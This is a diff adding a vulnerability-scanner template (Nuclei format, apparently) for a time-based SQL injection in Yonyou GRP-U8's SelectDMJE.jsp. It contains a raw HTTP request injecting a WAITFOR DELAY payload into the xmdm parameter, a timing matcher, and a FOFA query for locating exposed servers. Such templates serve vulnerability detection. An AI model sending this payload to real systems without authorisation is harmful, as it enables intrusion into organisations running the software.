@@ -1,0 +1,28 @@
+id: yonyou-grp-u8-SelectDMJE-sqli
+info:
+  name: 用友 GRP U8 SelectDMJE.jsp - sqli
+  author: leadlife
+  severity: high
+  description: 用友GRP-U8R10产品官方在售及提供服务的版本为U8Manager，产品分B、C、G三个产品系列，以上受到本次通报漏洞的影响。用友GRP-U8 SelectDMJE.jsp 存在SQL注入漏洞。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BGRP-U8-SelectDMJE.jsp_SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: app="用友-GRP-U8" || title="用友GRP-U8行政事业内控管理软件" || icon_hash="-299520369"
+  tags: yonyou,sqli,grpu8,oa,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /u8qx/SelectDMJE.jsp?gsdm=1&kjnd=1&userId=1&xmdm=1';WAITFOR+DELAY+'0:0:6'-- HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        Accept-Encoding: gzip, deflate
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5 && duration < 9
+        condition: and
